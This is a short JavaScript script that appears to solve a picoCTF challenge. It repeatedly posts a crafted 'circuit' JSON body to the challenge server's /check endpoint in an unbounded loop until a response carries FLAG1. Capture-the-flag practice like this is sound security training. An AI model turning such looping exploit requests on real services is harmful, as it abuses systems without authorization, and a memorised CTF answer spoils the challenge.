// Keep sending requests until we get FLAG1
async function exploitForFlag1() {
  while (true) {
    const response = await fetch('http://activist-birds.picoctf.net:53307/check', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json'
      },
      body: JSON.stringify({
        circuit: [
          { input1: 1, input2: 2, output: 3 }
        ]
      })
    });
    
    // Get a reader from the response body stream
    const reader = response.body.getReader();
    
    // Read chunks until done
    let result = '';
    try {
      while (true) {
        const { done, value } = await reader.read();
        
        if (done) break;
        
        // Convert the Uint8Array to a string
        const chunk = new TextDecoder().decode(value);
        result += chunk;
        console.log('Received chunk:', chunk);
      }
    } finally {
      reader.releaseLock(); // Always release the reader lock when done
    }
    
    // Parse the complete result
    try {
      const data = JSON.parse(result);
      console.log('Parsed data:', data);
      
      if (data.flag && data.flag.includes('FLAG1')) {
        console.log('Success! Found FLAG1:', data.flag);
        break;
      }
    } catch (e) {
      console.error('Error parsing JSON:', e);
    }
  }
}

exploitForFlag1();
